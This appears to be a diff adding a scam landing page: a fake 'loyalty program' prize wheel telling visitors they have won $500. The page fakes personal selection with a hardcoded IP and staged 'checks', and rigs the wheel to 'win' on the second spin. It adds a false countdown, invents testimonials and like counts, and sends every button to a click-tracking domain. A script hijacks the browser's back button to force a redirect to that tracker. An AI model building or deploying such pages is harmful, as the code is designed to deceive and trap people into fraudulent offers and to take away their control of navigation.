@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="robots" content="noindex, nofollow, noarchive">
+  <meta name="referrer" content="no-referrer">
+  <meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport">
+  <title>Congratulations!</title>
+  <meta content="notranslate" name="google">
+  <link rel="stylesheet" type="text/css" href="style.css">
+  <link rel="stylesheet" href="modal.css">
+  <script src="modal.js"></script>
+  <script src="jquery.min.js"></script>
+  <style>
+    #ip_text {
+      display: none;
+    }
+
+    #device_text {
+      display: none;
+    }
+
+    #browser_text {
+      display: none;
+    }
+
+    #loc_text {
+      display: none;
+    }
+
+    #os_text {
+      display: none;
+    }
+
+    #win_text {
+      display: none;
+    }
+
+    #ip_check {
+      display: none;
+    }
+
+    #device_check {
+      display: none;
+    }
+
+    #browser_check {
+      display: none;
+    }
+
+    #loc_check {
+      display: none;
+    }
+
+    #os_check {
+      display: none;
+    }
+  </style>
+  <script>
+    function getURLParameter(name) {
+      name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
+      var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
+        results = regex.exec(location.search);
+      return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
+    }
+    function dateOffset(f, c) {
+      var b = new Boolean(null == f || 0 == f || void 0 == f || "" == f),
+        h = new Date(Date.now() - 24 * f * 60 * 60 * 1000);
+      1 == b && (f = 0);
+      var d = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"],
+        g = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+      return null != !c && 0 != !c && void 0 != !c ? h.getDate() + " " + g[h.getMonth()] : "day_name_only" == c && b ?
+        d[h.getDay()] : "top_date" == c && b ? d[h.getDay()] + ", " + h.getDate() + " " + g[h.getMonth()] + " " + h
+          .getFullYear() : void 0
+    }
+  </script>
+  <script>
+    var days = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
+    var months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+
+    var myDate = new Date();
+    var fullDate = myDate.getDate() + " " + months[myDate.getMonth()] +
+      " " + myDate.getFullYear() + ", " + days[myDate.getDay()];
+  </script>
+  <script type="text/javascript">
+    function speak(c) {
+      var b = new SpeechSynthesisUtterance();
+      var a = speechSynthesis.getVoices();
+      b.voice = a[2];
+      b.voiceURI = "native";
+      b.volume = 1;
+      b.rate = 1;
+      b.pitch = 1;
+      b.text = c;
+      b.lang = "en-EN";
+      speechSynthesis.speak(b)
+    }
+    speak("Congratulations!");
+  </script>
+</head>
+<body onload="setButtonHeight(),autospin1()">
+  <div id="header">
+    <span class="menu"></span>
+    <h3><span id="headline">LOYALTY PROGRAM</span></h3><span class="icon"></span>
+  </div>
+  <div id="container">
+    <div align="center" id="firstpage">
+      <div class="date" id="topDate" style="padding-bottom:10px;margin:0">
+        <script>
+          document.write(fullDate);
+        </script>
+      </div>
+      <div style="margin-bottom:2px">
+        <div id="subheadline">
+          <p style="font-size:18px"><b>Congratulations!</b></p>
+          <p style="padding-top:10px">Today you are lucky!</p>
+        </div>
+        <div class="intro" style="padding-top:5px">
+          On <span id="today">
+            <script>
+              document.write(dateOffset(0, "day_name_only"));
+            </script>
+          </span> we choose <b>7</b>
+          users <b>Chrome</b>, to give them the chance to win gifts from our sponsors. Twist
+          wheel to see what kind of gift you get!
+        </div>
+        <div id="wheelCon">
+          <img class="spinAround2 transparent" height="540" id="wheel" src="roll.png"
+            width="540"> <input id="pressButton" onclick="spin()" style="top: 106.2px;" class="roller-button" type="button">
+          <div><img class="animated rotateIn" id="devMockup" src="money.png"
+              style="display: hidden; left: 64px; top: 42px;"></div>
+        </div>
+      </div>
+      <div id="secondpage">
+        <div class="congrats">
+          <h4>
+            <a href="https://coogletrck3.com/click.php?lp=1" style="cursor:pointer!important"
+              preventexitpop="false" rel="noreferrer">
+              <font color="#3C5A96">Congratulations!<br> <span style="color: #ff0000;">$500</span> almost yours!</font>
+            </a>
+          </h4>
+        </div>
+        <div class="congrats" style="text-align:center">
+          1. Click the "SELECT" button
+
+          <br>2. Confirm your delivery<br>
+
+          <b><br> <b>Important:</b> Hurry, limited quantities only.</b>
+        </div>
+        <div class="timer">You only have
+          <font color="red"><b><span id="mins">4</span> minutes и <span id="hsecs">59</span> seconds</b></font> to claim
+          your prize!
+        </div>
+        <div class="prize">
+          <table align="center">
+            <tbody>
+              <tr>
+                <th></th>
+                <td style="padding:10px 5px 10px 0;text-align:center"><img
+                    src="money-2.png" style="max-width:170px"></td>
+                <td style="line-height:1.6">
+                  <p style="text-align:left"><a href="https://coogletrck3.com/click.php?lp=1"
+                      style="cursor:pointer!important" preventexitpop="false" rel="noreferrer"><span class="name">$500</span></a></p>
+                  
+                  <div>
+                    <a class="button" href="https://coogletrck3.com/click.php?lp=1"
+                      style="cursor:pointer!important" preventexitpop="false" rel="noreferrer"> Select </a>
+                  </div>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+    <div class="container">
+      <div class="comments">
+        <div class="wi_like_wrap border_bottom">
+          <span class="like_people"><span class="like_people_images"><span class="like_people_image_wrap"><img
+                  class="like_people_image" height="24" src="615ef34722a34.jpg"
+                  width="24"></span> <span class="like_people_image_wrap"><img class="like_people_image" height="24"
+                  src="615ef34722a47.jpg" width="24"></span></span>
+            <span class="like_people_text">1537 people like it</span></span>
+        </div>
+        <div class="wi_buttons border_bottom">
+          <div class="wi_buttons_wrap">
+            <span class="like_wrap"><span class="item_like _i"><i class="i_like"></i> <b class="v_like">1537</b></span>
+              <span class="item_share is_empty _i"><i class="i_share"></i> <b class="v_share">234</b></span></span>
+            <span class="item_views"><i class="i_views"></i> <b class="v_views">544K</b></span>
+          </div>
+        </div>
+        <center>
+          <font face="arial"></font>
+          <table border="0" cellpadding="4" cellspacing="0" style="padding-top:10px;font-size:13px" width="100%">
+            <tbody id="comments_list">
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img
+                    src="1m.jpeg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_name">Alvin Tracy</div>
+                  <div class="comment_text">Fantastic! I've never won anything, but I am lucky!! </div>
+                  <div class="comments__item__meta">
+                    <div class="item_date">Yesterday в 08:13
+                    </div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">Like</span></span> <span class="pi_reply_wrap">·
+                      <span>Reply</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                  </div>
+                </td>
+              </tr>
+              <tr>
+                <td colspan="2">
+                  <hr>
+                </td>
+              </tr>
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img
+                    src="2m.jpeg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_name">Frank Bartlett</div>
+                  <div class="comment_text">It was easy, hope i get the $200...
+                  </div>
+                  <div class="comments__item__meta">
+                    <div class="item_date">
+                      <script>
+                        document.write(dateOffset(2));
+                      </script>
+                    </div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">Like</span></span> <span class="pi_reply_wrap">·
+                      <span>Reply</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                  </div>
+                </td>
+              </tr>
+              <tr>
+                <td colspan="2">
+                  <hr>
+                </td>
+              </tr>
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img
+                    src="3m.jpeg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_name">Linda Moore</div>
+                  <div class="comment_text">Saw this one time offer and clicked it off because I thought it was fake. I saw the ad again and because I was bored so I decided to try it ... And I got a 500 dollars! What!!?!
+                  </div>
+                  <div class="comments__item__meta">
+                    <div class="item_date">
+                      <script>
+                        document.write(dateOffset(2));
+                      </script>
+                    </div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">Like</span></span> <span class="pi_reply_wrap">·
+                      <span>Reply</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                  </div>
+                </td>
+              </tr>
+              <tr>
+                <td colspan="2">
+                  <hr>
+                </td>
+              </tr>
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img
+                    src="1w.jpg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_name">Ted Meyer</div>
+                  <div class="comment_text">Today there was a delivery! I gave the iPhone 13 to my lovely wife for her
+                    birthday... Love u babe )
+                  </div>
+                  <div class="comments__item__meta">
+                    <div class="item_date">
+                      <script>
+                        document.write(dateOffset(2));
+                      </script>
+                    </div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">Like</span></span> <span class="pi_reply_wrap">·
+                      <span>Reply</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                  </div>
+                </td>
+              </tr>
+              <tr>
+                <td colspan="2">
+                  <hr>
+                </td>
+              </tr>
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img
+                    src="3w.jpeg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_name">Vanessa Welker</div>
+                  <div class="comment_text">At first I thought it was a joke, but my $500 was actually credited this morning. #legit
+                  </div>
+                  <img class="comment__image" src="commets-money.jpg">
+                  <div class="comments__item__meta">
+                    <div class="item_date">
+                      <script>
+                        document.write(dateOffset(3));
+                      </script>
+                    </div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">Like</span></span> <span class="pi_reply_wrap">·
+                      <span>Reply</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                  </div>
+                </td>
+              </tr>
+              <tr>
+                <td colspan="2">
+                  <hr>
+                </td>
+              </tr>
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img
+                    src="4m.jpg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_name">Larry Vann</div>
+                  <div class="comment_text">Thanks for giving my brother a birthday present. Lol :D :D :Dm
+                    God Blessed.
+                  </div>
+                  <div class="comments__item__meta">
+                    <div class="item_date">
+                      <script>
+                        document.write(dateOffset(4));
+                      </script>
+                    </div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">Like</span></span> <span class="pi_reply_wrap">·
+                      <span>Reply</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                  </div>
+                </td>
+              </tr>
+              <tr>
+                <td colspan="2">
+                  <hr>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+          <div class="show_next_wrap">
+            <span class="show_next">See all</span>
+
+          </div>
+        </center>
+      </div>
+    </div>
+    <div class="fixed_footer"><img alt="" class="clip" src="615ef34722ad6.png"><input class="footer_input" placeholder="Your message" type="text"> <img alt="" class="btn_send" src="615ef34722ae5.png"></div>
+  </div>
+  <script type="text/javascript">
+    var page = ("page"),
+      brand = ("device_brand");
+
+    var conMid, mydate = new Date,
+      year = mydate.getFullYear(),
+      month = mydate.getMonth(),
+      day = mydate.getDate(),
+      weekday = mydate.getDay(),
+      count = 1,
+      headline = document.getElementById("headline"),
+      topDate = document.getElementById("topDate"),
+      today = document.getElementById("today"),
+      con = document.getElementById("container"),
+      whCon = document.getElementById("wheelCon"),
+      dWheel = document.getElementById("wheel"),
+      button = document.getElementById("pressButton"),
+      device = document.getElementById("devMockup"),
+      first = document.getElementById("firstpage"),
+      second = document.getElementById("secondpage");
+
+    function setButtonHeight() {
+      conMid = (whCon.getBoundingClientRect().bottom - whCon.getBoundingClientRect().top) / 2, button.style.top =
+        conMid - button.offsetHeight / 2 - 0.2 * button.offsetHeight / 2 + "px"
+    }
+
+    function spin() {
+      var modal = $modal({
+
+        content: '<p style="text-align:center;">You have 1 more chance!</p><br><p style="text-align:center;">Please try again!</p>',
+
+      });
+      switch (count) {
+
+        case 1:
+          button.disabled = !0, dWheel.className = "spinAround", setTimeout(function () {
+            button.disabled = !1, modal.show(), $('.modal__btn-close').click(function () { autospin2() });
+          }, 6800);
+          break;
+        case 2:
+          dWheel.className = "spinAround2", setTimeout(function () {
+            dWheel.className = dWheel.className + " transparent"
+          }, 6800), setTimeout(function () {
+            device.style.display = "block", device.style.left = whCon.offsetWidth / 2 - device.offsetWidth / 2 +
+              "px", device.style.top = conMid - device.offsetHeight / 2 + "px"
+          }, 7000), setTimeout(function () {
+            first.innerHTML = "<img src='loading.gif'>", first.style.padding = "195px 0px", setTimeout(function () {
+              first.parentNode.removeChild(first), second.style.display = "block", con.insertBefore(second, con
+                .firstChild), setInterval("countdown()", 1000)
+            }, 1500)
+          }, 9000)
+          confetti.clear();
+          document.getElementById('my-canvas').remove();
+
+      }
+      count++
+    }
+
+    function autospin2() {
+      spin()
+    }
+
+    function autospin1() {
+      var modal = $modal({
+
+        content: '<p style="text-align:center;">Congratulations! You have been chosen!</p><br><p id="ip_text" style="text-align:center; font-size: 13px;"><b>IP: 95.143.118.90</b> <img id="ip_check" src="check_icon.png" width="10" height="10"" alt="check"></p><br><p id="device_text" style="text-align:center; font-size: 13px;"><b>Device: Mobile</b> <img id="device_check" src="check_icon.png" width="10" height="10"" alt="check"></p><br><p id="browser_text" style="text-align:center; font-size: 13px;"><b>Browser: Chrome</b> <img id="browser_check" src="check_icon.png" width="10" height="10"" alt="check"></p><br><p id="loc_text" style="text-align:center; font-size: 13px;"><b>Location: Home</b> <img id="loc_check" src="check_icon.png" width="10" height="10"" alt="check"></p><br><p id="os_text" style="text-align:center; font-size: 13px;"><b>OS: Android</b> <img id="os_check"src="check_icon.png" width="10" height="10"" alt="check"></p><br><p style="text-align:center;">You are one of 7 people selected to participate in our loyalty program! You can get 1 gift out of 4!</p><br><p style="text-align:center;">✅ Win <strong>$500</strong></p><br> <p style="text-align:center;">Click "OK" to get started!</p>',
+
+      });
+      modal.show();
+      $("#ip_text").show('slow');
+      setTimeout(function () { $("ip_text").hide('slow'); }, 500);
+
+      $("#device_text").show('slow');
+      setTimeout(function () { $("device_text").hide('slow'); }, 1000);
+
+      $("#browser_text").show('slow');
+      setTimeout(function () { $("browser_text").hide('slow'); }, 3000);
+
+      $("#loc_text").show('slow');
+      setTimeout(function () { $("loc_text").hide('slow'); }, 3500);
+
+      $("#os_text").show('slow');
+      setTimeout(function () { $("os_text").hide('slow'); }, 4500);
+
+      setTimeout(function () { $('#ip_check').fadeIn(100); }, 1500);
+      setTimeout(function () { $('#device_check').fadeIn(100); }, 2000);
+      setTimeout(function () { $('#browser_check').fadeIn(100); }, 4000);
+      setTimeout(function () { $('#loc_check').fadeIn(100); }, 4500);
+      setTimeout(function () { $('#os_check').fadeIn(100); }, 5100);
+
+      $('.modal__btn-close').click(function () {
+        document.getElementById("pressButton").click()
+      });
+    }
+    function countdown() {
+      var d = parseInt(document.getElementById("mins").innerHTML),
+        c = parseInt(document.getElementById("hsecs").innerHTML),
+        b = 0,
+        a = 0;
+      0 !== d && 0 === c ? (b = d - 1, a = 59) : 0 !== d || 0 !== c ? (b = d, a = c - 1) : 0 === d && 0 === c && (b = d,
+        a = c), a < 10 && (a = "0" + a), document.getElementById("mins").textContent = b, document.getElementById(
+          "hsecs").textContent = a
+    };
+  </script>
+  <script src="6156e5fb2308d.js"></script>
+  <canvas id="my-canvas" style="position:absolute; top:0; width: 100%;"  height="880"></canvas>
+  <button id="show-modal" class="btn"></button>
+  <script>
+    var confettiSettings = { target: 'my-canvas' };
+    var confetti = new ConfettiGenerator(confettiSettings);
+    confetti.render();
+  </script>
+<script>
+	window.history.pushState({ page: 1 }, '', '');
+	window.onpopstate = function(event) {
+		if (event) {
+			window.location.href = 'https://coogletrck3.com/click.php?key=0lp9k1kle3m19wqtwn9o';
+		}
+	}
+</script>
+</body>
+</html>
